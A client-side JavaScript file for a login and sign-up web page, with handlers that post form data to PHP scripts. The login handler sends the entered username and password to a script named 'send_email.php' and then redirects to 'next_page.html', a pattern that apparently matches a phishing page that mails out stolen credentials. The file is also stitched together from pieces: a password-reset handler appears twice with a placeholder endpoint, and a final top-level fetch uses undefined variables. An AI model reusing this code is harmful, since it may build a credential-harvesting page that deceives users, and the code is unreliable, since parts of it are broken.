document.getElementById('ResetPassword').addEventListener('click', function(event) {
    event.preventDefault(); // Prevent the default form submission

    // Assuming your username field is within a form and its id is 'username'
    var email = document.getElementById('username').value;
    
    // Data to be sent to the server
    var formData = new FormData();
    formData.append('username', email);

    // Fetch API to send the form data to the PHP script and handle the response
    fetch('sendEmail.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text()) // Convert the response to text
    .then(data => {
        // Display the PHP script's response
        alert(data); // Or use any other method to display the message
    })
    .catch(error => {
        console.error('Error:', error);
    });
});

document.getElementById('CreateA').addEventListener('click', function(event) {
    window.location.href = 'create_account.html'; 
});

document.getElementById('loginBb').addEventListener('click', function(event) {
    window.location.href = 'security.html'; 
});


document.getElementById('SignUp').addEventListener('click', function(event) {
    window.location.href = 'index.html'; 
});

document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username.trim() && password.trim()) {
        fetch('send_email.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message); 
            window.location.href = "next_page.html"; 
        })
        .catch(error => {
            alert('Login failed: ' + error.message);
        });
    } else {
        alert('Please enter both username and password.');
    }
});

function toggleMenu() {
    var menuContainer = document.getElementById('menuContainer');
    if (menuContainer.style.right == '0px') {
        menuContainer.style.right = '-250px'; // Hide the menu
    } else {
        menuContainer.style.right = '0px'; // Show the menu
    }
}

document.getElementById('ResetPassword').addEventListener('click', function() {
    var email = document.getElementById('username').value; // Assuming the email is entered in the same field as username
    if(email) { // Simple validation
        fetch('your_password_reset_script.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'username=' + encodeURIComponent(email)
        })
        .then(response => response.text())
        .then(data => alert(data))
        .catch((error) => {
            console.error('Error:', error);
        });
    } else {
        alert('Please enter your email address.');
    }
});


document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        const formData = new FormData(form);

        fetch('signup.php', { // Make sure this matches the action attribute of your form
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message); // Show the message as an alert
            if(data.success) {
                // Optionally, redirect the user or clear the form if the registration was successful
                // window.location.href = 'login.html'; // Redirect to login page or another success page
                form.reset(); // Clear the form fields
            }
        })
        .catch(error => console.error('Error:', error));
    });
});

fetch('signup.php', {
    method: 'POST',
    body: formData
})
.then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
})
.then(data => {
    alert(data.message);
    if(data.success) {
        form.reset(); // Clear the form fields
    }
})
.catch(error => {
    console.error('Error:', error);
    alert('An error occurred. Please try again.');
});

